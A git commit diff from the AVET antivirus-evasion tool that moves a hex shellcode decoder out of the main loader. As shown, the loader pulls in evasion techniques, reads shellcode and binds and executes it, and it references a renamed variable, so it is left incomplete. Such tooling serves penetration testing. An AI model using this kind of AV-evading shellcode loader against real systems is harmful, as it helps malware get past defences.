cb3da466399fc3f3af58f26a02ff0bcbeaf48f7f
Florian Saager <florian.saager@rub.de>
2018-11-05 14:55:10 +0100

    Outsourced old avet decoder

--- source/avet.c
+++ source/avet.c
@@ -26,13 +26,16 @@ Web: https://github.com/govolution/avet
 //     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
 //         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"
 
-#include "defs.h"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
 #include <tchar.h>
 
+
+// Include shellcode decoding method to be used here
+#include "encoding.h"
 
 // Include shellcode binding technique to be used here
 #include "shellcode_binding.h"
@@ -41,60 +44,21 @@ Web: https://github.com/govolution/avet
 #include "get_shellcode.h"
 
 
-unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-
-
 int main (int argc, char **argv)
 {		
-	char *uvalue = NULL;	
-
-	int index;
-	int c;
-
-	opterr = 0;	
-		
 	// Include evasion techniques to be used here
 	#include "techniques.h"	
 	
 	// Retrieve shellcode	
-	unsigned char *shellcode = get_shellcode(argv[1]);	
+	unsigned char *encoded_shellcode = get_shellcode(argv[1]);	
+	
+	// Decode shellcode
+	//void decode_shellcode(const unsigned char *ciphertext, unsigned char *plaintext, const int ciphetext_length, const unsigned char key)
+	
 	
 	// Bind and execute shellcode here
 	// buf is defined in defs.h by make_avet and contains the shellcode	
 	bind_shellcode(shellcode);
 	
 	return 0;
-}
-
-
-// return pointer to shellcode
-unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
-{
-	int j=0;
-	shellcode=malloc((size/2));
-
-	#ifdef PRINT_DEBUG
-		printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);
-	#endif
-
-	int i=0;
-	do
-	{
-		unsigned char temp[3]={0};
-		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
-		shellcode[j] = strtoul(temp, NULL, 16);
-
-		#ifdef PRINT_DEBUG
-			printf("%x",shellcode[j]);
-		#endif
-
-		i+=2;
-		j++;
-	} while(i<size);
-
-	#ifdef PRINT_DEBUG
-		printf("\n ");
-	#endif
-
-	return shellcode;
 }
